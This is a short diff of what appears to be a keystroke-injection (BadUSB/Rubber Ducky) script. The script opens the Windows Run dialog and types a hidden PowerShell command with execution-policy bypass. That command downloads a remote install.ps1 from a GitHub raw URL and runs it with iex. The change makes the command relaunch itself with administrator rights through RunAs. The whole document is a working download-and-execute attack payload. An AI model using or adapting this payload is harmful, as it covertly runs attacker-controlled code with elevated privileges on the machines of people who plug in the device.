@@ -1,5 +1,5 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/install.ps1 | iex
+STRING powershell -Command "Start-Process powershell -ArgumentList '-w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/install.ps1 | iex' -Verb RunAs"
 DELAY 500
 ENTER
